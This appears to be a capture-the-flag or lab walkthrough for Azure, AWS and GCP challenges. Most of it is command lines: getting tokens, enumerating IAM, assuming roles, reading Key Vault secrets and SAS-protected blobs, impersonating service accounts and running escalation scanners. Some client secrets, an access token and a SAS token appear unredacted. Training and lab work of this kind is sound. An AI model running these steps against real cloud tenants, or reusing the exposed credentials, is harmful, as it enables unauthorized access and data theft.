# Offensive
## Uncovering the App Registration
Domain_Name: `secure-corp.org`

### Step 1: Discover the Tenant ID
```
https://www.whatismytenantid.com/

https://login.microsoftonline.com/secure-corp.org/.well-known/openid-configuration
```
### Step 2: Authenticate to Azure
```sh
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "client_id=caaa28c5-b8da-4d29-b42e-<redacted>" -d "scope=https://graph.microsoft.com/.default" -d "client_secret=bXj8Q~_v1Y.<redacted>" -d "grant_type=client_credentials" "https://login.microsoftonline.com/f2a33211-e46a-4c92-b84d-<redacted>/oauth2/v2.0/token"

{"token_type":"Bearer","expires_in":3599,"ext_expires_in":3599,"access_token":"eyJ0eXAiOiJKV1QiLCJub25jZSI6ImJ3cXdQUW1lNE80Z0x6ZVRTSVZmNlZjT1BoNEtoNXBRaHpwOVhILTJ0U3ciLCJhbGciOiJSUzI1NiIsIng1dCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyIsImtpZCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9mMmEzMzIxMS1lNDZhLTRjOTItYjg0ZC1hZmYwNmMyY2QxM2YvIiwiaWF0IjoxNzY0MjQ2OTI0LCJuYmYiOjE3NjQyNDY5MjQsImV4cCI6MTc2NDI1MDgyNCwiYWlvIjoiazJKZ1lGQ3RYL1UzbmExZ2tkM09tNG9aZlBwNkFBPT0iLCJhcHBfZGlzcGxheW5hbWUiOiJkZXYtYXBwIiwiYXBwaWQiOiJjYWFhMjhjNS1iOGRhLTRkMjktYjQyZS05NWIxYWJhNmI4MWMiLCJhcHBpZGFjciI6IjEiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9mMmEzMzIxMS1lNDZhLTRjOTItYjg0ZC1hZmYwNmMyY2QxM2YvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiJkNmJjNThlZC0xMWY2LTQ3Y2QtYTE2OC1lNGQ2MDZjNWIyMmEiLCJyaCI6IjEuQWI0QUVUS2o4bXJra2t5NFRhX3diQ3pSUHdNQUFBQUFBQUFBd0FBQUFBQUFBQUFqQVFDLUFBLiIsInJvbGVzIjpbIkFwcGxpY2F0aW9uLlJlYWQuQWxsIl0sInN1YiI6ImQ2YmM1OGVkLTExZjYtNDdjZC1hMTY4LWU0ZDYwNmM1YjIyYSIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJBUyIsInRpZCI6ImYyYTMzMjExLWU0NmEtNGM5Mi1iODRkLWFmZjA2YzJjZDEzZiIsInV0aSI6IjIyT3p4UXdTTmtTSVFCY3dvTmJhQUEiLCJ2ZXIiOiIxLjAiLCJ3aWRzIjpbIjA5OTdhMWQwLTBkMWQtNGFjYi1iNDA4LWQ1Y2E3MzEyMWU5MCJdLCJ4bXNfYWNkIjoxNzI2NTc3Nzk4LCJ4bXNfYWN0X2ZjdCI6IjMgOSIsInhtc19mdGQiOiJSQUx0NS1JbHJpWE9ZQ2piS0JDTUg2SWQ5bXpDLWNpaWdEYWszUEFwdndJQmEyOXlaV0Z6YjNWMGFDMWtjMjF6IiwieG1zX2lkcmVsIjoiMTIgNyIsInhtc19yZCI6IjAuNDJMallCSmkyc2NvSk1MQkxpU1F4ckZ0WmRMOFo2N3pKNFV5RmoyYnZCQW95aWtrWUxuVy0yeHdtSUxuN09VVGd3M1R0eFVCUlRtRUJKZ1pJT0FBbEFZQSIsInhtc19zcGN1IjoidHJ1ZSIsInhtc19zdWJfZmN0IjoiOSAzIiwieG1zX3RjZHQiOjE3MjAwNzEyNTQsInhtc190bnRfZmN0IjoiMyAxNCJ9.eOMfb10u06ZMEurrCKgDg_NJpR7ENvrKHqyh9xWoO6Ws6HkW-xnmtIkNgQdQfAta33Tt6uQ-zOU-E5MlIbfvEMPwj4ItkzdsmrFPBMj7nmRO6qTgQ0skZ_CErkDFJw87ZNOL6tCD-lAQ_kf85ALEgYfKSX5ynLWpUYGU5ORuaX7zQc5Uw5uNE1jwz66MlEp-ZFYP7hD_0XHDrIwVu4scWRIBqipnTz80RlDUkirqmvwTd908Y9FFjiXlJ33RX4WJDO00AjrCi_-YCbpLTA4UGzw_uE9CGaJLqDK255Z5U6hMbrciIpzGIQQHfGsRJe6vFbephejtu8FD9ppZF0gIyw"}
```
### Step 3: Connect to Microsoft Graph API
Установка модуля Microsoft Graph
```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
Install-Module Microsoft.Graph -Scope CurrentUser -Repository PSGallery -Force
```

Authentication Azure through access token, that we received in the previous step
```powershell
$token ='Access_Token'
$secureClientToken = ConvertTo-SecureString $token -AsPlainText -Force
```

```powershell
Connect-MgGraph -AccessToken $secureClientToken
```
### Step 4: Enumerate App Registrations
```powershell
Get-MgApplication
```
### Step 5: Investigate API Permissions
```powershell
#To get the details of the App Registration
$app= Get-MgApplication -ApplicationId e0c87d9c-5d45-43ea-ba30-7bb1b3a8019c

#To get the details about the permission for an application
$app.RequiredResourceAccess | ConvertTo-Json
```
### Step 6: Find the Exact API Role
```powershell
#To get the API Permissions of App Registration
$res = Get-MgServicePrincipal -Filter "DisplayName eq 'Microsoft Graph'"
$res.AppRoles | Where-Object { $_.Id -eq '9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30' } | ConvertTo-Json
```

---
## Who Am IAM?
### Step 1: Configure AWS CLI with Given Credentials
```sh
aws configure
aws sts get-caller-identity
```
### Step 2: Enumerate IAM Groups
```
aws iam list-groups
```
### Step 3: Enumerate IAM Users
```
aws iam list-users
```
### Step 4: Enumerate IAM Roles
```
aws iam list-roles

#For specific role (inline)
aws iam list-role-policies --role-name <rolename>

#For the current user
aws iam list-attached-role-policies --role-name <rolename>
```
### Step 5: Retrieve Role Details
```
#For specific role
aws iam get-role --role-name <rolename>

#For the specific role and policy (inline)
aws iam get-role-policy --role-name <rolename> --policy-name <policy_name>
```
### Step 6: Enumerate IAM Policies
```
aws iam list-policies

#For the specific user (inline)
aws iam list-user-policies --user-name <username>

#For the current user
aws iam list-attached-user-policies --user-name <username>
```
### Step 7: Enumerate Group Policies
```
# For the specific Group
aws iam list-attached-group-policies --group-name <GroupName>

# For the specific Group (inline)
aws iam list-group-policies --group-name <GroupName>
```
### Step 8: Retrieve Policy Details
```
# For the specific policy
aws iam get-policy --policy-arn <policy_arn>

# For the specific user with th specific policy (inline)
aws iam get-user-policy --user-name <username> --policy-name <policy_name>
```
### Automated Tool - Pacu (AWS Exploitation Framework)
```
pip3 install -U pip
pip3 install -U pacu
pacu

#To set credentials
set key YOUR_AWS_KEY
#To Lists all available Pacu modules.
list
#To select a specific module to use.
use
#To execute the command.
Run 

#To enumerate all users, roles, policies, and groups in the AWS account.
use iam__enum_users_roles_policies_groups

#To check the permissions of the currently authenticated user or role
use iam__enum_permissions

#To analyze the IAM environment and return a report highlighting any privilege escalation opportunities that exist for the current session.
run iam__privsec_scan
```
### Automated Tool - enumerate-iam (IAM Permissions Analyzer)
```
git clone https://github.com/andresriancho/enumerate-iam.git
cd enumerate-iam
pip install -r requirements.txt

#Discovered a set of AWS credentials but unsure of their permissions?
python enumerate-iam.py --access-key <AKIA....> --secret-key <15H72mm...>
```

---
## Trust Me, Relationship is Malicious
### 1. Configure AWS CLI with Given Credentials
```
aws configure --profile IAM01
aws sts get-caller-identity --profile IAM01
```
### 2. Hunt for Misconfigured IAM Roles
**Method 1: Using a Recon Tool**
```sh
python assume_role_enum.py --account-id 058264439561 --profile IAM01
```
**Method 2: Using AWS CLI**
```sh
aws sts assume-role --role-arn arn:aws:iam::058264439561:role/DBAdmin --role-session-name Role-Session --profile IAM01
```
### 3. Configure Temporary Credentials
```sh
aws configure set aws_access_key_id [key-id] --profile Role
aws configure set aws_secret_access_key [key-id] --profile Role
aws configure set aws_session_token [token] --profile Role

aws sts get-caller-identity --profile Role
```
### 4. Enumerate Permissions & Locate the Flag
```
#To list the permission attached to the Role
aws iam list-attached-role-policies --role-name Manager_Role --profile Role

#To get the permission attached to the Role
aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/Manager_Access_S3 --version-id v1 --profile Role

#To list the bucket objects
aws s3 ls s3://securecorpbakstoragebuk/ --recursive --profile Role

#To download the Flag.txt object which contains the flag.
aws s3api get-object --bucket securecorpbakstoragebuk --key docs/Flag.txt flag.txt --profile Role

```

---
## IAM Access Compass (gcloud)
### 1. authenticate with the given credentials
```sh
gcloud auth activate-service-account --key-file testing-srvacc-key.json
```
### 2. Getting Project Details
```
gcloud projects list
```
### 3. Getting Service Accounts
```
#To list the Service Accounts for specific project
gcloud iam service-accounts list --project=woven-acolyte-428406-v9
```
### 4. Mapping the IAM Landscape
```
#To list the policy binding (Custom roles)
gcloud projects get-iam-policy woven-acolyte-428406-v9

#For Service Account to Service Account Permission
gcloud iam service-accounts get-iam-policy devops-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com

#For specific Service Account
gcloud projects get-iam-policy woven-acolyte-428406-v9 --flatten="bindings[].members" --filter="bindings.members:serviceAccount:testing-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com" --format="table(bindings.role)"

#To list all the roles
gcloud iam roles list --project=woven-acolyte-428406-v9
```
### 5. Uncovering Hidden Secrets
```
#To get the bucket policy
gcloud storage buckets get-iam-policy gs://secret-bucket-woven-acolyte-428406-v9

#To list all objects in the bucket, including those in subdirectories (recursively)
gsutil ls -r gs://secret-bucket-woven-acolyte-428406-v9

#To download the file
gsutil cp gs://secret-bucket-woven-acolyte-428406-v9/secret.txt .
```
### 6. Automated Tool - GCP Privilege Escalation Scanner
```sh
git clone https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation.git
cd .\GCP-IAM-Privilege-Escalation\
cd .\PrivEscScanner\

pip3 install google-auth google-auth-oauthlib google-auth-httplib2 google-api-python-client

gcloud auth print-access-token
python3 enumerate_member_permissions.py --project-id woven-acolyte-428406-v9 #paste token

python3 check_for_privesc.py
```

---
## Enumerating Cognito
### **Step:01**
First let’s visit the provided URL & click on the Job Portal Login button.
### **Step:02**
After the redirection to the Cognito URL, copy the Client ID and open AWS CLI
### **Step 3**
In the AWS CLI run the following command to register a new user
```sh
aws cognito-idp sign-up \
  --region ap-south-1 \
  --client-id 6h6b6gvm11k0eis3l4vhkhgi67 \
  --username testtt \
  --password testasdfaADSfa34 \
  --user-attributes '[{"Name":"email","Value":"a@s31frc3.ru"}]'
```
### **Step 4**
Check the email address and the TO ADDRESS is the flag.

---
## simulate-principal-policy Mirage
### Step 1: Configure AWS CLI with Given Credentials
```
aws configure
aws sts get-caller-identity 
```
### Step 2: Create a Permission List
```
ec2:StartInstances
s3:ListBucket
iam:CreateUser
```
### Step 3: Enumerate IAM Permissions
```sh
#!/bin/bash

PRINCIPAL_ARN="arn:aws:iam::058264439561:user/DevAppUser"

while read -r permission; do
    [[ -z "$permission" ]] && continue

    echo "Permission: $permission"
    
    aws iam simulate-principal-policy \
        --policy-source-arn "$PRINCIPAL_ARN" \
        --action-names "$permission" \

    echo -e "\n"
done < policy.txt
```

---

## Vaulted Keys and Hidden Blobs
### Step 1: Discover the Tenant ID
```
https://login.microsoftonline.com/secure-corp.org/.well-known/openid-configuration

f2a33211-e46a-4c92-b84d-aff06c2cd13f
```
### Step 2: Authenticate with Azure
```sh
az login --service-principal -u 76e1a895-1f05-4165-83ab-<redacted> -p 6LU8Q~<redacted> --tenant f2a33211-e46a-4c92-b84d-aff06c2cd13f
```
### Step 3: Enumerate Role Assignments
```sh
az role assignment list --assignee 76e1a895-1f05-4165-83ab-98eed07bed86 --output json --all
```
### Step 4: Locate the Key Vault & Retrieve Secrets
```sh
#To list the KeyVault in your Subscription
az keyvault list --resource-group DataBack-RG

#To list the KeyVault in your Resource Group
az keyvault list --subscription 662a4fee-a3ba-49b3-9caf-8c20ed04503f

#Once we get the KeyVault name, try to get the secrets:
az keyvault secret list --vault-name secopprobackkv
az keyvault secret show --name secopprobacksaSAASToken --vault-name secopprobackkv
```
### Step 5: Retrieve Storage details
```sh
az storage container list --account-name secopprobacksa --sas-token "sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=0t6AaxsrIAHeqdwok%2FFq4xtviXOHLrwQfvdMWTG2zKE%3D" --output table

#This command will help you to list all the containers within that storage account.
az storage blob list --account-name secopprobacksa --container-name secopprobacksc --sas-token "sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=0t6AaxsrIAHeqdwok%2FFq4xtviXOHLrwQfvdMWTG2zKE%3D" --output table

az storage blob download --account-name secopprobacksa --container-name secopprobacksc --name Flag.txt --file Flag.txt --sas-token "sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=0t6AaxsrIAHeqdwok%2FFq4xtviXOHLrwQfvdMWTG2zKE%3D" --output table
```
## Service Account Impersonation Odyssey
### Step 1: Authenticate to GCP
```sh
gcloud auth activate-service-account --key-file GCPChallengeCredentials.json

Activated service account credentials for: [hd-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com]
```
### Step 2: List Projects
```sh
gcloud projects list

PROJECT_ID               NAME  PROJECT_NUMBER  ENVIRONMENT
woven-acolyte-428406-v9  Prod  129668539536
```
### Step 3: Identify Permissions of Your Service Account
```sh
gcloud projects get-iam-policy woven-acolyte-428406-v9 --flatten="bindings[].members" --filter="bindings.members:serviceAccount:hd-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com" --format='table(bindings.role)'

ROLE
roles/iam.serviceAccountViewer
roles/viewer
```
### Step 4: Enumerate Other Service Accounts
```sh
gcloud iam service-accounts list --project woven-acolyte-428406-v9
```
### Step 5: Check Permissions for Another Service Account
```sh
gcloud iam service-accounts get-iam-policy func-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com --project woven-acolyte-428406-v9
```
### Step 6: Investigate Cloud Functions
```sh
gcloud functions list --project woven-acolyte-428406-v9
```
### Step 7: Investigate Cloud Function IAM Policies
```sh
# To get the policy attached to the function
gcloud functions get-iam-policy secops-function --project woven-acolyte-428406-v9

# To get the details of role
gcloud iam roles describe customEditorNoDelete --project woven-acolyte-428406-v9
```
### Step 8: Exploit Service Account Impersonation
**Approach-1: Using Impersonation**
```sh
gcloud functions call secops-function --project woven-acolyte-428406-v9 --impersonate-service-account func-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com
```
**Approach-2: Using access token**
```sh
gcloud auth print-access-token --impersonate-service-account=func-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com

gcloud functions call secops-function --project woven-acolyte-428406-v9 --access-token-file token.txt
```
## EntraID Permission Atlas
### Step 1: Authenticate to Azure
```sh
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" \
-d "client_id=caaa28c5-b8da-4d29-b42e-95b1aba6b81c" \
-d "scope=https://graph.microsoft.com/.default" \
-d "client_secret=bXj8Q~_v1Y.hArjCqwQBUhCE-MwAvqB_Q1AcAa-V" \
-d "grant_type=client_credentials" \
https://login.microsoftonline.com/f2a33211-e46a-4c92-b84d-aff06c2cd13f/oauth2/v2.0/token

#or like this
az login --service-principal -u e8086d7e-9304-4597-a447-<redacted> -p RvL8Q~<redacted>~M119m~9Rp3K-aFx --tenant f2a33211-e46a-4c92-b84d-aff06c2cd13f
```
### Step 2: Enumerate Users, Groups & Applications
```sh
#To list the Users
az ad user list --query '[].{User:displayName, UPN:userPrincipalName, ObjectId:objectId}'

#List all groups:
az ad group list --query '[].{Name:displayName, ObjectId:objectId}' --output table

#To list the Applications (App Registrations)
az ad app list --query '[].{AppName:displayName, AppId:appId, ObjectId:objectId}'

#To list the Service Principals
az ad sp list --query '[].{SPName:displayName, AppId:appId, ObjectId:objectId}'
```
### Step 3: Investigate IAM Roles & Permissions
```sh
#To get the roles assigned with the users
az role assignment list --assignee 'user_principal_name' --all

#To get the role assigned with the service principls
az role assignment list --assignee <ServicePrincipalObjectId> --query '[].{Role:roleDefinitionName, Scope:scope}'

#To get the role definition
az role definition list --query '[].{RoleName:roleName, Id:id}' --output table
```
### Step 4: Identify the App Registration Owner
```sh
#To get the details about application permission
az ad app show --id <ApplicationId> --query "requiredResourceAccess"

#To get the details of App Role of Application (App Registration)
az ad app show --id 84a6fe6a-2642-4832-b0d1-f8e0c4cad633 --query "appRoles"

#To know who is the owner of App Registration
az ad app owner list --id <AppObjectId> --query '[].{OwnerName:displayName, OwnerUPN:userPrincipalName}'

#To know who is the owner of App Registration using Mggraph
Get-MgApplicationOwner -ApplicationId "84a6fe6a-2642-4832-b0d1-f8e0c4cad633" | ConvertTo-Json
```
### Automated Tool - MicroBurst
```
github.com/NetSPI/MicroBurst
```
## Service Principals Permission Paradox








# Defensive
## User Account Creation Alchemy
Analytics → Discover
Executing the query below helps filter events that are specifically related to platform log activity.

```
event.dataset: aws.cloudtrail
```
filter events related to the "CreateUser" action
```
event.dataset: aws.cloudtrail and aws.cloudtrail.user_identity.type: IAMUser and event.action: "CreateUser" 
```
